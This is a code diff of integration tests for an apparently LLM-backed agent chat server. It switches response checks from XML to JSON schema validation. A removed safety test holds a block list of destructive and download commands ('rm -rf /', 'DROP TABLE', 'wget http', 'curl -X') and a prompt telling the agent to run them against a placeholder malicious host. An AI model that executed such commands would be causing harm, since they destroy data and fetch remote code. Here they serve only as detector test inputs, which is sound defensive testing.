@@ -2,151 +2,96 @@ import { expect, test, describe, beforeAll, afterAll } from 'bun:test'
 import { DynamicTool } from '@langchain/core/tools'
 import { logger } from '@/logger'
 import server from '@/index'
-import { parseXMLContent, validateXMLResponse, validateXMLTypes } from '@/xml'
+import { ReActResponseSchema } from '@/types/agent'
 
 interface StreamEvent {
   event: string
   threadId?: string
   data?: {
-    type?: string
     content?: string
-    xmlType?: string
-    xmlContent?: string
+    error?: string
   }
-}
-
-const processStreamChunk = (chunk: Uint8Array, partialLine: string): [StreamEvent[], string] => {
-  const events: StreamEvent[] = []
-  const decoder = new TextDecoder()
-  const textChunk: string = partialLine + decoder.decode(chunk)
-  const lines = textChunk.split('\n')
-  const remainingPartialLine = lines.pop() || ''
-
-  for (const line of lines) {
-    const trimmedLine = line.trim()
-    if (!trimmedLine || !trimmedLine.startsWith('data: ')) continue
-
-    try {
-      const data = JSON.parse(trimmedLine.slice(6)) as StreamEvent
-      if (data && data.data?.content) {
-        const xmlData = parseXMLContent(data.data.content)
-        if (xmlData) {
-          data.data.xmlType = xmlData.type
-          data.data.xmlContent = xmlData.raw
-        }
-      }
-      events.push(data)
-    } catch (error) {
-      logger.error('Error parsing SSE event:', { line: trimmedLine, error })
-    }
-  }
-
-  return [events, remainingPartialLine]
-}
-
-const readStreamWithTimeout = async (
-  reader: ReadableStreamDefaultReader<Uint8Array>,
-  maxAttempts = 10
-): Promise<StreamEvent[]> => {
-  const allEvents: StreamEvent[] = []
-  let attempts = 0
-  let partialLine = ''
-
-  while (attempts < maxAttempts) {
-    try {
-      const { done, value } = await reader.read()
-      if (done) break
-
-      if (value) {
-        const [events, remaining] = processStreamChunk(value, partialLine)
-        partialLine = remaining
-        allEvents.push(...events)
-
-        // Check if we've received an end event
-        const hasEndEvent = events.some(event => event.event === 'end')
-        if (hasEndEvent) break
-      }
-    } catch (error) {
-      logger.error('Stream read error:', { error })
-      throw error // Propagate the error for proper test failure
-    }
-    attempts++
-  }
-
-  return allEvents
 }
 
 const findEventByPredicate = (
   events: StreamEvent[],
   predicate: (event: StreamEvent) => boolean
-): boolean => {
-  if (!Array.isArray(events)) return false
-  for (const event of events) {
+) => {
+  return events.some(predicate)
+}
+
+const readStreamWithTimeout = async (
+  reader: ReadableStreamDefaultReader<Uint8Array>,
+  timeout: number = 30000
+): Promise<StreamEvent[]> => {
+  const allEvents: StreamEvent[] = []
+  let attempts = 0
+  let partialLine = ''
+
+  while (attempts < timeout) {
     try {
-      if (!event) continue
-      if (predicate(event)) return true
-    } catch {
-      continue
+      const { done, value } = await reader.read()
+      if (done) break
+
+      const text = new TextDecoder().decode(value)
+      const lines = (partialLine + text).split('\n')
+      partialLine = lines.pop() || ''
+
+      for (const line of lines) {
+        const trimmedLine = line.trim()
+        if (!trimmedLine || trimmedLine === '') continue
+
+        if (!trimmedLine.startsWith('data: ')) {
+          logger.warn('Unexpected SSE line format:', { line: trimmedLine })
+          continue
+        }
+
+        try {
+          const data = JSON.parse(trimmedLine.slice(6)) as StreamEvent
+          if (data && data.data?.content) {
+            allEvents.push(data)
+          }
+        } catch (error) {
+          logger.error('Error parsing SSE event:', { line: trimmedLine, error })
+        }
+      }
+
+      attempts++
+    } catch (error) {
+      logger.error('Error reading stream:', error)
+      break
     }
   }
-  return false
+
+  return allEvents
 }
 
-const validateStreamEventXMLResponse = (event: StreamEvent, type: string): boolean => {
-  if (!event?.event || event.event !== 'message') return false
-  if (!event.data?.xmlType || !event.data.xmlContent) return false
-  return validateXMLResponse(event.data.xmlContent, type)
-}
-
-const validateStreamEventXMLContent = (
-  event: StreamEvent,
-  type: string,
-  contentPredicate?: (content: string) => boolean
-): boolean => {
-  if (!event?.event || event.event !== 'message') return false
-  if (!event.data?.xmlType || !event.data.xmlContent) return false
-
-  const xmlData = parseXMLContent(event.data.xmlContent)
-  if (!xmlData) return false
-  if (!contentPredicate) return true
-
-  return contentPredicate(xmlData.content)
-}
-
-const validateStreamEventXMLTypes = (event: StreamEvent, types: string[]): boolean => {
-  if (!event?.event || event.event !== 'message') return false
-  if (!event.data?.xmlType || !event.data.xmlContent) return false
-  return validateXMLTypes(event.data.xmlContent, types)
-}
-
-const countMatchingEvents = (
-  events: StreamEvent[],
-  predicate: (event: StreamEvent) => boolean
-): number => {
-  if (!Array.isArray(events)) return 0
-  let count = 0
-  for (const event of events) {
-    try {
-      if (!event) continue
-      const result = predicate(event)
-      if (result === true) count++
-    } catch {
-      continue
-    }
+const validateStreamEventResponse = (event: StreamEvent, type: string): boolean => {
+  if (!event.data?.content) return false
+  try {
+    const response = JSON.parse(event.data.content)
+    return ReActResponseSchema.safeParse(response).success && response.type === type
+  } catch {
+    return false
   }
-  return count
 }
 
-const validateEventTypeAndThreadId = (
+const validateStreamEventContent = (
   event: StreamEvent,
   type: string,
-  threadId: string
+  contentPredicate: (content: any) => boolean
 ): boolean => {
-  if (!event) return false
-  const eventType = event.event
-  const eventThreadId = event.threadId
-  if (!eventType || !eventThreadId) return false
-  return eventType === type && eventThreadId === threadId
+  if (!event.data?.content) return false
+  try {
+    const response = JSON.parse(event.data.content)
+    return (
+      ReActResponseSchema.safeParse(response).success &&
+      response.type === type &&
+      contentPredicate(response)
+    )
+  } catch {
+    return false
+  }
 }
 
 describe('Server Integration Tests', () => {
@@ -160,20 +105,17 @@ describe('Server Integration Tests', () => {
     logger.trace('Server stopped')
   })
 
-  test('should handle chat endpoint with basic query and thread persistence', async () => {
+  test('should handle basic chat interaction', async () => {
     let reader: ReadableStreamDefaultReader<Uint8Array> | undefined
-    const threadId = 'test-thread-1'
 
     try {
-      // First chat request
-      const response1 = await server.fetch(
+      const response = await server.fetch(
         new Request('http://localhost:3001/chat', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             type: 'chat',
-            threadId,
-            messages: [{ role: 'user', content: 'What is TypeScript?' }],
+            messages: [{ role: 'user', content: 'Tell me about TypeScript' }],
             modelName: 'qwen2.5-coder:1.5b',
             host: 'http://localhost:11434',
             safetyConfig: {
@@ -186,79 +128,28 @@ describe('Server Integration Tests', () => {
         })
       )
 
-      expect(response1.status).toBe(200)
-      expect(response1.headers.get('content-type')).toBe('text/event-stream')
-
-      reader = response1.body?.getReader()
+      expect(response.status).toBe(200)
+      reader = response.body?.getReader()
       if (!reader) {
         throw new Error('No response body reader available')
       }
 
       const events = await readStreamWithTimeout(reader)
-
-      const foundStart = findEventByPredicate(
-        events,
-        event => event.event === 'start' && event.threadId === threadId
-      )
-
-      const foundMessage = findEventByPredicate(events, event =>
-        validateStreamEventXMLTypes(event, ['chat', 'final', 'thought'])
-      )
-
-      const foundEnd = findEventByPredicate(
-        events,
-        event => event.event === 'end' && event.threadId === threadId
-      )
-
-      expect(foundStart).toBe(true)
-      expect(foundMessage).toBe(true)
-      expect(foundEnd).toBe(true)
-
-      await reader.cancel()
-
-      // Second chat request in same thread
-      const response2 = await server.fetch(
-        new Request('http://localhost:3001/chat', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            type: 'chat',
-            threadId,
-            messages: [{ role: 'user', content: 'What are its key features?' }],
-            modelName: 'qwen2.5-coder:1.5b',
-            host: 'http://localhost:11434',
-            safetyConfig: {
-              requireToolConfirmation: false,
-              requireToolFeedback: false,
-              maxInputLength: 8192,
-              dangerousToolPatterns: [],
-            },
-          }),
-        })
-      )
-
-      expect(response2.status).toBe(200)
-
-      reader = response2.body?.getReader()
-      if (!reader) {
-        throw new Error('No response body reader available')
-      }
-
-      const events2 = await readStreamWithTimeout(reader)
-
-      const foundStartAgain = findEventByPredicate(
-        events2,
-        event => event.event === 'start' && event.threadId === threadId
-      )
-
-      const foundContextualMessage = findEventByPredicate(events2, event => {
-        if (!validateStreamEventXMLTypes(event, ['chat', 'final', 'thought'])) return false
-        const xmlData = parseXMLContent(event.data?.xmlContent || '')
-        return xmlData ? xmlData.content.toLowerCase().includes('typescript') : false
+      const foundTypescriptResponse = findEventByPredicate(events, event => {
+        if (!event.data?.content) return false
+        try {
+          const response = JSON.parse(event.data.content)
+          return (
+            ReActResponseSchema.safeParse(response).success &&
+            ['chat', 'final', 'thought'].includes(response.type) &&
+            response.content.toLowerCase().includes('typescript')
+          )
+        } catch {
+          return false
+        }
       })
 
-      expect(foundStartAgain).toBe(true)
-      expect(foundContextualMessage).toBe(true)
+      expect(foundTypescriptResponse).toBe(true)
     } finally {
       if (reader) {
         await reader.cancel()
@@ -367,7 +258,7 @@ describe('Server Integration Tests', () => {
 
       const events = await readStreamWithTimeout(reader)
       const foundToolExecution = findEventByPredicate(events, event =>
-        validateStreamEventXMLContent(event, 'tool', content => content.includes(testTool.name))
+        validateStreamEventContent(event, 'tool', content => content.includes(testTool.name))
       )
 
       expect(foundToolExecution).toBe(true)
@@ -412,8 +303,11 @@ describe('Server Integration Tests', () => {
       let warningCount = 0
 
       for (const event of events) {
-        if (validateStreamEventXMLTypes(event, ['warning', 'error'])) {
-          const content = event.data?.xmlContent?.toLowerCase() || ''
+        if (
+          validateStreamEventResponse(event, 'warning') ||
+          validateStreamEventResponse(event, 'error')
+        ) {
+          const content = event.data?.content?.toLowerCase() || ''
           if (content.includes('dangerous') || content.includes('safety')) {
             warningCount++
           }
@@ -478,8 +372,9 @@ describe('Server Integration Tests', () => {
       }
 
       const events = await readStreamWithTimeout(reader)
-      const foundThreadId = findEventByPredicate(events, event =>
-        validateEventTypeAndThreadId(event, 'start', customThreadId)
+      const foundThreadId = findEventByPredicate(
+        events,
+        event => validateStreamEventResponse(event, 'start') && event.threadId === customThreadId
       )
 
       expect(foundThreadId).toBe(true)
@@ -553,7 +448,7 @@ describe('Server Integration Tests', () => {
     const testTool = new DynamicTool({
       name: 'confirmation-test-tool',
       description: 'A tool requiring confirmation',
-      func: async (input: string) => `Processed with confirmation: ${input}`,
+      func: async (input: string) => `Processed: ${input}`,
     })
 
     // Register tool
@@ -602,8 +497,8 @@ describe('Server Integration Tests', () => {
 
       const events = await readStreamWithTimeout(reader)
       const foundConfirmationRequest = findEventByPredicate(events, event =>
-        validateStreamEventXMLContent(event, 'confirmation', content =>
-          content.includes(testTool.name)
+        validateStreamEventContent(event, 'confirmation', response =>
+          response.content.includes(testTool.name)
         )
       )
 
@@ -669,7 +564,9 @@ describe('Server Integration Tests', () => {
 
       const events = await readStreamWithTimeout(reader)
       const foundFeedbackRequest = findEventByPredicate(events, event =>
-        validateStreamEventXMLContent(event, 'feedback', content => content.includes(testTool.name))
+        validateStreamEventContent(event, 'feedback', response =>
+          response.content.includes(testTool.name)
+        )
       )
 
       expect(foundFeedbackRequest).toBe(true)
@@ -711,11 +608,15 @@ describe('Server Integration Tests', () => {
       }
 
       const events = await readStreamWithTimeout(reader)
-      const warningCount = countMatchingEvents(events, event => {
-        if (!validateStreamEventXMLTypes(event, ['warning', 'error'])) return false
-        const content = event.data?.xmlContent?.toLowerCase() || ''
+      const warningCount = events.filter(event => {
+        if (
+          !validateStreamEventResponse(event, 'warning') &&
+          !validateStreamEventResponse(event, 'error')
+        )
+          return false
+        const content = event.data?.content?.toLowerCase() || ''
         return content.includes('dangerous') || content.includes('safety')
-      })
+      }).length
 
       expect(warningCount).toBeGreaterThanOrEqual(2)
     } finally {
@@ -725,151 +626,9 @@ describe('Server Integration Tests', () => {
     }
   })
 
-  test('should validate XML response format for all response types', async () => {
+  test('should validate response format and content structure', async () => {
     let reader: ReadableStreamDefaultReader<Uint8Array> | undefined
-    const threadId = 'xml-validation-thread'
-
-    try {
-      const response = await server.fetch(
-        new Request('http://localhost:3001/chat', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            type: 'chat',
-            threadId,
-            messages: [
-              { role: 'user', content: 'Tell me about TypeScript and show some code examples' },
-            ],
-            modelName: 'qwen2.5-coder:1.5b',
-            host: 'http://localhost:11434',
-            safetyConfig: {
-              requireToolConfirmation: false,
-              requireToolFeedback: false,
-              maxInputLength: 8192,
-              dangerousToolPatterns: [],
-            },
-          }),
-        })
-      )
-
-      expect(response.status).toBe(200)
-      reader = response.body?.getReader()
-      if (!reader) {
-        throw new Error('No response body reader available')
-      }
-
-      const events = await readStreamWithTimeout(reader)
-      const validResponseTypes = new Set(['chat', 'thought', 'code', 'final'])
-      const foundResponseTypes = new Set<string>()
-
-      for (const event of events) {
-        if (event.data?.xmlType && validResponseTypes.has(event.data.xmlType)) {
-          foundResponseTypes.add(event.data.xmlType)
-          const content = event.data.xmlContent
-          if (!content) continue
-
-          switch (event.data.xmlType) {
-            case 'chat':
-            case 'thought':
-              expect(content).toMatch(/<content>.*<\/content>/s)
-              break
-            case 'code':
-              expect(content).toMatch(/<language>.*<\/language>/s)
-              expect(content).toMatch(/<code>.*<\/code>/s)
-              break
-            case 'final':
-              expect(content).toMatch(/<summary>.*<\/summary>/s)
-              break
-          }
-        }
-      }
-
-      expect(foundResponseTypes.size).toBe(validResponseTypes.size)
-    } finally {
-      if (reader) {
-        await reader.cancel()
-      }
-    }
-  })
-
-  test('should handle safety checks with multiple dangerous patterns', async () => {
-    let reader: ReadableStreamDefaultReader<Uint8Array> | undefined
-    const dangerousPatterns = [
-      'rm -rf /',
-      'DROP TABLE',
-      'sudo rm',
-      'wget http',
-      'curl -X',
-      'eval(',
-      'exec(',
-    ]
-
-    try {
-      const response = await server.fetch(
-        new Request('http://localhost:3001/chat', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            type: 'chat',
-            messages: [
-              {
-                role: 'user',
-                content:
-                  'Use rm -rf / and then DROP TABLE users; also try wget http://malicious.com',
-              },
-            ],
-            modelName: 'qwen2.5-coder:1.5b',
-            host: 'http://localhost:11434',
-            safetyConfig: {
-              requireToolConfirmation: true,
-              requireToolFeedback: true,
-              maxInputLength: 8192,
-              dangerousToolPatterns: dangerousPatterns,
-            },
-          }),
-        })
-      )
-
-      expect(response.status).toBe(200)
-      reader = response.body?.getReader()
-      if (!reader) {
-        throw new Error('No response body reader available')
-      }
-
-      const events = await readStreamWithTimeout(reader)
-
-      // Verify warning events for each dangerous pattern
-      const warningEvents = events.filter(
-        event =>
-          validateStreamEventXMLTypes(event, ['warning', 'error']) &&
-          event.data?.xmlContent?.toLowerCase().includes('dangerous')
-      )
-
-      // Should have at least one warning for each detected pattern
-      expect(warningEvents.length).toBeGreaterThanOrEqual(3)
-
-      // Verify specific warnings
-      expect(
-        warningEvents.some(event => event.data?.xmlContent?.toLowerCase().includes('rm -rf'))
-      ).toBe(true)
-
-      expect(
-        warningEvents.some(event => event.data?.xmlContent?.toLowerCase().includes('drop table'))
-      ).toBe(true)
-
-      expect(
-        warningEvents.some(event => event.data?.xmlContent?.toLowerCase().includes('wget'))
-      ).toBe(true)
-    } finally {
-      if (reader) {
-        await reader.cancel()
-      }
-    }
-  })
-
-  test('should validate XML response format and content structure', async () => {
-    let reader: ReadableStreamDefaultReader<Uint8Array> | undefined
-    const threadId = 'xml-validation-thread'
+    const threadId = 'validation-thread'
 
     try {
       const response = await server.fetch(
@@ -908,26 +667,31 @@ describe('Server Integration Tests', () => {
       expect(startEvent?.threadId).toBe(threadId)
 
       // Verify chat messages
-      const chatEvents = events.filter(event => validateStreamEventXMLResponse(event, 'chat'))
+      const chatEvents = events.filter(event => validateStreamEventResponse(event, 'chat'))
       expect(chatEvents.length).toBeGreaterThan(0)
       chatEvents.forEach(event => {
-        expect(event.data?.xmlContent).toMatch(/<content>.*<\/content>/s)
+        const response = JSON.parse(event.data?.content || '')
+        expect(response.type).toBe('chat')
+        expect(typeof response.content).toBe('string')
       })
 
       // Verify code examples
-      const codeEvents = events.filter(event => validateStreamEventXMLResponse(event, 'code'))
+      const codeEvents = events.filter(event => validateStreamEventResponse(event, 'code'))
       expect(codeEvents.length).toBeGreaterThan(0)
       codeEvents.forEach(event => {
-        const content = event.data?.xmlContent || ''
-        expect(content).toMatch(/<language>.*<\/language>/s)
-        expect(content).toMatch(/<code>.*<\/code>/s)
+        const response = JSON.parse(event.data?.content || '')
+        expect(response.type).toBe('code')
+        expect(response.language).toBeDefined()
+        expect(response.code).toBeDefined()
       })
 
       // Verify final summary
-      const finalEvents = events.filter(event => validateStreamEventXMLResponse(event, 'final'))
+      const finalEvents = events.filter(event => validateStreamEventResponse(event, 'final'))
       expect(finalEvents.length).toBeGreaterThan(0)
       finalEvents.forEach(event => {
-        expect(event.data?.xmlContent).toMatch(/<summary>.*<\/summary>/s)
+        const response = JSON.parse(event.data?.content || '')
+        expect(response.type).toBe('final')
+        expect(typeof response.content).toBe('string')
       })
 
       // Verify end event
